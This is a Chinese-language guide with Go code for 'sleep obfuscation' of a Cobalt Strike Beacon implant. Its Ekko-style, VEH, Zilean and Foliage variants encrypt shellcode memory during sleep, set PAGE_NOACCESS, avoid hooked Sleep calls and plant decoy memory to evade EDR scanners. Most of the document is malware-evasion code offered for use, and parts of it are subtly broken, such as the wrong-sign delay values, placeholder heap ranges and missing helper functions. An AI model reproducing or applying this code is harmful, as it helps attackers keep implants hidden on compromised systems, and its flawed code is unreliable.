# 内存加密保护 - Beacon长驻模式

## ⚠️ Beacon模式特殊注意事项

### 1. 不要使用WaitForSingleObject等待

```go
// ❌ Beacon模式不要等待线程完成
thread := createThread(addr)
waitForSingleObject(thread, INFINITE)  // 会阻塞Beacon，无法上线

// ✓ Beacon模式：创建线程后立即返回
thread := createThread(addr)
// Beacon会自己管理睡眠和唤醒周期
```

### 2. 睡眠混淆与Beacon睡眠同步

Beacon有自己的睡眠周期（Cobalt Strike中设置sleep时间），睡眠混淆需要在Beacon睡眠时叠加：

```
Beacon执行流程：
├─ 执行命令/任务
├─ 准备睡眠 → 【此时触发加密】
│   ├─ 加密shellcode内存
│   ├─ 设置PAGE_NOACCESS
│   └─ Beacon调用sleep
├─ 睡眠期间 → 内存被加密保护
├─ 睡眠结束 → 【此时触发解密】
│   ├─ 解密shellcode内存
│   ├─ 设置PAGE_EXECUTE_READ
│   └─ Beacon继续执行
└─ 循环往复
```

### 3. 堆加密注意事项

```go
// ⚠️ 堆加密可能影响Beacon配置
// 建议：只加密敏感字符串，不加密Beacon核心结构

// 可以加密：
// - C2服务器地址字符串
// - 加密密钥（AES/ChaCha20密钥）
// - 用户名/密码等凭据字符串

// 不要加密：
// - Beacon配置结构体（会影响通信）
// - 内存管理元数据（会崩溃）
```

---

## 说明

**本文档是"内存加密保护"技术的Beacon长驻模式实现。**

内存加密保护技术有两种模式：
- **单次执行模式** - 见 memory_evasion.md
- **Beacon长驻模式** - 见本文档（睡眠期间加密，唤醒时解密）

---

## Beacon长驻模式原理

- Beacon睡眠期间加密内存中的shellcode
- 防止睡眠期间内存扫描发现特征
- 唤醒时解密恢复执行
- 循环往复直到任务完成

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

// Beacon长驻模式：睡眠期间内存加密保护
func beaconSleepObfuscation(duration uint32, addr uintptr, size uintptr, key []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    VirtualProtect := kernel32.NewProc("VirtualProtect")
    NtDelayExecution := ntdll.NewProc("NtDelayExecution")

    // 1. 修改内存保护为可读写
    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))

    // 2. XOR加密shellcode（睡眠期间隐藏特征）
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key[i%uintptr(len(key))]
    }

    // 3. 设置PAGE_NOACCESS（阻止内存扫描）
    VirtualProtect.Call(addr, size, 0x01, uintptr(unsafe.Pointer(&oldProtect)))

    // 4. 使用NtDelayExecution等待（不触发Sleep Hook）
    // 100ns单位：duration秒 = duration * 1000 * 10000
    var delay uint64 = uint64(duration) * 1000 * 10000
    NtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))

    // 5. 解密shellcode
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key[i%uintptr(len(key))]
    }

    // 6. 设置PAGE_EXECUTE_READ
    VirtualProtect.Call(addr, size, 0x20, uintptr(unsafe.Pointer(&oldProtect)))
}
```

---

## 其他实现方式

### 定时器版（不推荐）

**警告：定时器回调方式可能导致程序崩溃，不推荐使用！**

```go
// 不推荐：定时器回调方式复杂且不稳定
func beaconSleepWithTimer(duration uint32, addr uintptr, size uintptr, key []byte) {
    // 定时器回调在Go中实现复杂
    // syscall.NewCallback创建的回调可能与定时器机制不兼容
    // 建议使用上面的NtDelayExecution版本
}
```

### VEH异常处理版

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
)

// VEH版：使用异常处理器自动解密
func beaconSleepWithVEH(duration uint32, addr uintptr, size uintptr, key []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    VirtualProtect := kernel32.NewProc("VirtualProtect")
    AddVectoredExceptionHandler := kernel32.NewProc("AddVectoredExceptionHandler")
    NtDelayExecution := ntdll.NewProc("NtDelayExecution")

    // 1. 加密shellcode
    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key[i%uintptr(len(key))]
    }

    // 2. 设置PAGE_NOACCESS（触发异常）
    VirtualProtect.Call(addr, size, 0x01, uintptr(unsafe.Pointer(&oldProtect)))

    // 3. 注册VEH处理器（访问时自动解密）
    handler := syscall.NewCallback(func(code, record, context, _ uintptr) uintptr {
        if code == 0xC0000005 { // 访问违规
            // 解密shellcode
            VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
            for i := uintptr(0); i < size; i++ {
                ptr := (*byte)(unsafe.Pointer(addr + i))
                *ptr ^= key[i%uintptr(len(key))]
            }
            // 设置PAGE_EXECUTE_READ
            VirtualProtect.Call(addr, size, 0x20, uintptr(unsafe.Pointer(&oldProtect)))
            return 0 // EXCEPTION_CONTINUE_EXECUTION
        }
        return 1 // EXCEPTION_CONTINUE_SEARCH
    })
    AddVectoredExceptionHandler.Call(1, handler)

    // 4. 使用NtDelayExecution等待
    var delay uint64 = uint64(duration) * 1000 * 10000
    NtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))
}
```

---

## 4. 堆加密

```go
// 加密堆内存中的敏感数据
func encryptHeapData() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    // 获取堆范围（需要分析程序堆使用情况）
    // 这里是示例代码
    
    heapStart := getHeapStartAddress()
    heapSize := getHeapSize()
    key := []byte("HeapEncryptKey123")
    
    // 修改保护属性
    var oldProtect uint32
    VirtualProtect.Call(heapStart, heapSize, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    
    // XOR加密
    xorEncryptMemory(heapStart, heapSize, key)
    
    // 恢复保护
    VirtualProtect.Call(heapStart, heapSize, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func getHeapStartAddress() uintptr {
    // 使用GetProcessHeap获取堆信息
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    GetProcessHeap := kernel32.NewProc("GetProcessHeap")
    HeapValidate := kernel32.NewProc("HeapValidate")
    
    heap, _, _ := GetProcessHeap.Call()
    return heap // 实际需要更复杂的逻辑获取堆范围
}
```

---

## 5. PE波动（模拟合法PE行为）

```go
// PE波动：让shellcode内存区域看起来像合法PE
func peFluctuation(addr uintptr, size uintptr) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    Sleep := kernel32.NewProc("Sleep")

    // 周期性切换内存保护属性
    protections := []uint32{
        0x02, // PAGE_READONLY - 像数据段
        0x20, // PAGE_EXECUTE_READ - 像代码段
        0x04, // PAGE_READWRITE - 像数据段修改
    }

    var oldProtect uint32

    // 模拟正常PE的内存行为
    for i := 0; i < 10; i++ {
        VirtualProtect.Call(addr, size, uintptr(protections[i%3]), uintptr(unsafe.Pointer(&oldProtect)))

        // 短暂等待
        Sleep.Call(100)
    }

    // 最终设置为执行状态
    VirtualProtect.Call(addr, size, 0x20, uintptr(unsafe.Pointer(&oldProtect)))
}
```

---

## 6. 完整睡眠混淆流程

```go
import (
    "golang.org/x/sys/windows"
    "unsafe"
)

func comprehensiveSleepObfuscation(sc []byte, sleepDuration uint32) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    Sleep := kernel32.NewProc("Sleep")

    // 1. 执行shellcode
    addr := executeShellcode(sc)

    // 2. 等待执行完成后的回连
    Sleep.Call(5000)

    // 3. 进入睡眠混淆循环
    key := generateSimpleKey(16)

    for {
        // 使用睡眠混淆
        beaconSleepObfuscation(sleepDuration, addr, uintptr(len(sc)), key)

        // 等待下一次命令
        // ...
    }
}

// 简单密钥生成（不依赖crypto/rand，避免编译问题）
func generateSimpleKey(length int) []byte {
    key := make([]byte, length)
    // 使用简单伪随机生成
    for i := 0; i < length; i++ {
        key[i] = byte((i * 17 + 31) % 256)
    }
    return key
}
```

---

## 7. Zilean睡眠混淆（高级版）

**原理：**
- 使用线程池定时器替代Sleep
- 睡眠前加密所有堆栈内存
- 通过Rop链实现内存权限切换
- 触发硬件断点解密执行

**特点：**
- 级别：隐蔽性高，稳定性低
- 使用CreateTimerQueueTimer替代Sleep
- 加密范围：堆+栈+shellcode内存
- 需要精确的堆栈地址追踪

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
)

// Zilean睡眠混淆：线程池定时器 + 堆栈加密
func zileanSleepObfuscation(duration uint32, shellcodeAddr uintptr, shellcodeSize uintptr) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    CreateTimerQueue := kernel32.NewProc("CreateTimerQueue")
    CreateTimerQueueTimer := kernel32.NewProc("CreateTimerQueueTimer")
    DeleteTimerQueueEx := kernel32.NewProc("DeleteTimerQueueEx")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    NtDelayExecution := ntdll.NewProc("NtDelayExecution")

    // 1. 获取当前线程的堆栈范围
    stackBase, stackLimit := getStackRange()
    heapBase, heapSize := getHeapRange()

    // 2. 生成加密密钥
    key1 := generateSimpleKey(32) // 堆加密密钥
    key2 := generateSimpleKey(16) // shellcode加密密钥
    key3 := generateSimpleKey(16) // 栈加密密钥

    // 3. 加密堆内存（敏感数据）
    encryptMemoryRange(heapBase, heapSize, key1)

    // 4. 加密shellcode内存
    var oldProtect uint32
    VirtualProtect.Call(shellcodeAddr, shellcodeSize, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    xorEncryptMemory(shellcodeAddr, shellcodeSize, key2)
    VirtualProtect.Call(shellcodeAddr, shellcodeSize, 0x01, uintptr(unsafe.Pointer(&oldProtect)))

    // 5. 加密栈内存（可选，风险较高）
    // encryptMemoryRange(stackBase, stackLimit-stackBase, key3)

    // 6. 创建定时器队列
    timerQueue, _, _ := CreateTimerQueue.Call()

    // 7. 创建定时器回调（唤醒时解密）
    timerCallback := syscall.NewCallback(func(param uintptr, timerCalled uintptr) uintptr {
        // 解密堆内存
        decryptMemoryRange(heapBase, heapSize, key1)

        // 解密shellcode内存
        VirtualProtect.Call(shellcodeAddr, shellcodeSize, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
        xorDecryptMemory(shellcodeAddr, shellcodeSize, key2)
        VirtualProtect.Call(shellcodeAddr, shellcodeSize, 0x20, uintptr(unsafe.Pointer(&oldProtect)))

        // 解密栈内存
        // decryptMemoryRange(stackBase, stackLimit-stackBase, key3)

        return 0
    })

    // 8. 设置定时器（等待duration后触发解密）
    var timerHandle uintptr
    CreateTimerQueueTimer.Call(
        uintptr(unsafe.Pointer(&timerHandle)),
        timerQueue,
        timerCallback,
        0,
        duration*1000, // 毫秒
        0,             // 只触发一次
        0x00000020)    // WT_EXECUTEINTIMERTHREAD

    // 9. 等待定时器触发（使用NtDelayExecution）
    var delay uint64 = uint64(duration) * 1000 * 10000
    NtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))

    // 10. 清理定时器队列
    DeleteTimerQueueEx.Call(timerQueue, uintptr(0xFFFFFFFF)) // INVALID_HANDLE_VALUE
}

// 获取当前线程堆栈范围
func getStackRange() (uintptr, uintptr) {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    NtQueryInformationThread := ntdll.NewProc("NtQueryInformationThread")

    // ThreadStackLimits信息类
    var stackLimits THREAD_STACK_LIMITS
    var returnLength uint32

    // 获取当前线程
    GetCurrentThread := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetCurrentThread")
    thread, _, _ := GetCurrentThread.Call()

    // 查询堆栈范围（信息类需要根据系统确定）
    NtQueryInformationThread.Call(
        thread,
        0, // ThreadBasicInformation（包含StackBase/Limit）
        uintptr(unsafe.Pointer(&stackLimits)),
        uintptr(unsafe.Sizeof(stackLimits)),
        uintptr(unsafe.Pointer(&returnLength)))

    return stackLimits.StackBase, stackLimits.StackLimit
}

// 获取堆范围
func getHeapRange() (uintptr, uintptr) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    GetProcessHeap := kernel32.NewProc("GetProcessHeap")
    HeapWalk := kernel32.NewProc("HeapWalk")

    heap, _, _ := GetProcessHeap.Call()

    // 需要遍历堆获取范围（简化版本）
    // 实际需要HeapWalk遍历所有堆块

    return heap, 0x10000 // 示例范围
}

// 加密内存范围
func encryptMemoryRange(base uintptr, size uintptr, key []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")

    var oldProtect uint32
    VirtualProtect.Call(base, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))

    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(base + i))
        *ptr ^= key[i%uintptr(len(key))]
    }

    VirtualProtect.Call(base, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

// 解密内存范围
func decryptMemoryRange(base uintptr, size uintptr, key []byte) {
    // XOR解密与加密相同
    encryptMemoryRange(base, size, key)
}

type THREAD_STACK_LIMITS struct {
    StackBase  uintptr
    StackLimit uintptr
}
```

---

## 8. Foliage睡眠混淆（双层加密版）

**原理：**
- Ekko基础 + 双层加密增强
- 第一层：XOR加密（快速）
- 第二层：AES/ChaCha20加密（高强度）
- 使用堆栈欺骗隐藏加密上下文
- 睡眠期间内存完全不可访问

**特点：**
- 级别：隐蔽性极高，稳定性中等
- 双层加密：XOR + AES/ChaCha20
- 内存保护：PAGE_NOACCESS + PAGE_GUARD双重保护
- 堆栈欺骗：加密上下文存储在伪装的堆区域

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
    "crypto/aes"
    "crypto/cipher"
)

// Foliage睡眠混淆：双层加密 + 堆栈欺骗
func foliageSleepObfuscation(duration uint32, shellcodeAddr uintptr, shellcodeSize uintptr) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    VirtualProtect := kernel32.NewProc("VirtualProtect")
    NtDelayExecution := ntdll.NewProc("NtDelayExecution")
    CreateTimerQueueTimer := kernel32.NewProc("CreateTimerQueueTimer")
    CreateTimerQueue := kernel32.NewProc("CreateTimerQueue")

    // ===== 第一阶段：准备加密上下文 =====

    // 1. 生成双层加密密钥
    xorKey := generateSimpleKey(32)       // 第一层XOR密钥
    aesKey := generateSimpleKey(32)       // 第二层AES密钥（32字节）
    aesNonce := generateSimpleKey(12)     // AES nonce（12字节）

    // 2. 备份原始shellcode（用于恢复）
    backupShellcode(shellcodeAddr, shellcodeSize)

    // 3. 创建加密上下文结构（存储在堆中）
    ctx := &FoliageContext{
        ShellcodeAddr: shellcodeAddr,
        ShellcodeSize: shellcodeSize,
        XorKey:        xorKey,
        AesKey:        aesKey,
        AesNonce:      aesNonce,
        EncryptedData: nil,
    }

    // ===== 第二阶段：双层加密 =====

    var oldProtect uint32

    // 第一层：XOR加密
    VirtualProtect.Call(shellcodeAddr, shellcodeSize, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    xorEncryptMemory(shellcodeAddr, shellcodeSize, xorKey)

    // 第二层：AES加密（需要先读取内存再加密）
    encryptedData := aesEncryptMemory(shellcodeAddr, shellcodeSize, aesKey, aesNonce)
    ctx.EncryptedData = encryptedData

    // 将加密数据写回内存
    for i := uintptr(0); i < uintptr(len(encryptedData)); i++ {
        ptr := (*byte)(unsafe.Pointer(shellcodeAddr + i))
        *ptr = encryptedData[i]
    }

    // ===== 第三阶段：双重内存保护 =====

    // 3a. 设置PAGE_NOACCESS（阻止任何访问）
    VirtualProtect.Call(shellcodeAddr, shellcodeSize, 0x01, uintptr(unsafe.Pointer(&oldProtect)))

    // 3b. 设置PAGE_GUARD（触发异常，增加检测难度）
    // 注意：PAGE_GUARD只能在PAGE_NOACCESS之上叠加
    // 这里简化处理，实际需要更复杂的内存保护组合

    // ===== 第四阶段：堆栈欺骗 =====

    // 在堆中创建伪装的"正常数据"区域
    decoyAddr := createDecoyRegion(shellcodeSize)
    fillDecoyWithNormalData(decoyAddr, shellcodeSize)

    // ===== 第五阶段：定时器唤醒 =====

    timerQueue, _, _ := CreateTimerQueue.Call()

    timerCallback := syscall.NewCallback(func(param uintptr, timerCalled uintptr) uintptr {
        // 获取加密上下文
        ctxPtr := (*FoliageContext)(unsafe.Pointer(param))

        // 第一阶段解密：AES解密
        decryptedData := aesDecryptMemory(ctxPtr.EncryptedData, ctxPtr.AesKey, ctxPtr.AesNonce)

        // 写回内存
        VirtualProtect.Call(ctxPtr.ShellcodeAddr, ctxPtr.ShellcodeSize, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
        for i := uintptr(0); i < uintptr(len(decryptedData)); i++ {
            ptr := (*byte)(unsafe.Pointer(ctxPtr.ShellcodeAddr + uintptr(i)))
            *ptr = decryptedData[i]
        }

        // 第二阶段解密：XOR解密
        xorDecryptMemory(ctxPtr.ShellcodeAddr, ctxPtr.ShellcodeSize, ctxPtr.XorKey)

        // 设置PAGE_EXECUTE_READ
        VirtualProtect.Call(ctxPtr.ShellcodeAddr, ctxPtr.ShellcodeSize, 0x20, uintptr(unsafe.Pointer(&oldProtect)))

        // 清理伪装区域
        cleanupDecoyRegion(decoyAddr)

        return 0
    })

    var timerHandle uintptr
    CreateTimerQueueTimer.Call(
        uintptr(unsafe.Pointer(&timerHandle)),
        timerQueue,
        timerCallback,
        uintptr(unsafe.Pointer(ctx)), // 传递加密上下文
        duration*1000,
        0,
        0x00000020)

    // ===== 第六阶段：等待 =====

    var delay uint64 = uint64(duration) * 1000 * 10000
    NtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))
}

// Foliage加密上下文结构
type FoliageContext struct {
    ShellcodeAddr uintptr
    ShellcodeSize uintptr
    XorKey        []byte
    AesKey        []byte
    AesNonce      []byte
    EncryptedData []byte
}

// AES加密内存
func aesEncryptMemory(addr uintptr, size uintptr, key []byte, nonce []byte) []byte {
    // 读取内存数据
    data := make([]byte, size)
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        data[i] = *ptr
    }

    // 创建AES block
    block, _ := aes.NewCipher(key)

    // 使用CTR模式（无需padding）
    stream := cipher.NewCTR(block, nonce)

    // 加密
    encrypted := make([]byte, len(data))
    stream.XORKeyStream(encrypted, data)

    return encrypted
}

// AES解密内存
func aesDecryptMemory(encrypted []byte, key []byte, nonce []byte) []byte {
    block, _ := aes.NewCipher(key)
    stream := cipher.NewCTR(block, nonce)

    decrypted := make([]byte, len(encrypted))
    stream.XORKeyStream(decrypted, encrypted)

    return decrypted
}

// 备份原始shellcode
func backupShellcode(addr uintptr, size uintptr) []byte {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")

    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))

    backup := make([]byte, size)
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        backup[i] = *ptr
    }

    VirtualProtect.Call(addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
    return backup
}

// 创建伪装区域（用于欺骗内存扫描）
func createDecoyRegion(size uintptr) uintptr {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")

    addr, _, _ := VirtualAlloc.Call(0, size, 0x1000|0x2000, 0x04) // PAGE_READWRITE
    return addr
}

// 填充伪装区域（使用低熵"正常"数据）
func fillDecoyWithNormalData(addr uintptr, size uintptr) {
    // 填充看起来像正常程序的数据
    normalData := []byte{
        // 伪装成配置字符串
        'C', 'o', 'n', 'f', 'i', 'g', 'u', 'r', 'a', 't', 'i', 'o', 'n', 0x00,
        // 伪装成路径字符串
        'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 0x00,
        // 伪装成版本信息
        '1', '0', '.', '0', '.', '1', '9', '0', '4', '1', '.', '1', 0x00,
    }

    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr = normalData[i%uintptr(len(normalData))]
    }
}

// 清理伪装区域
func cleanupDecoyRegion(addr uintptr) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualFree := kernel32.NewProc("VirtualFree")
    VirtualFree.Call(addr, 0, 0x8000) // MEM_RELEASE
}
```

---

## 9. 技术对比（更新版）

| 技术 | 稳定性 | 隐蔽性 | 实现复杂度 | 加密层数 | 适用场景 |
|------|--------|--------|------------|----------|----------|
| Ekko | 中 | 高 | 中 | 1层XOR | Beacon基础 |
| **Zilean** | 低 | 高 | 高 | 堆+栈+shellcode | 高对抗EDR |
| **Foliage** | 中 | 极高 | 高 | 2层(XOR+AES) | 极高隐蔽需求 |
| 堆加密 | 中 | 中 | 低 | 堆内存 | Beacon增强 |
| PE波动 | 高 | 中 | 低 | PE伪装 | 内存扫描规避 |

---

## 8. 注意事项

1. **避免Sleep API**：使用NtDelayExecution或定时器代替Sleep
2. **多层加密**：Foliage使用双层加密增强保护
3. **VEH注册**：确保异常处理器正确处理其他异常
4. **定时器清理**：使用后清理定时器队列
5. **密钥管理**：每次睡眠可使用不同密钥
6. **兼容性**：测试不同Windows版本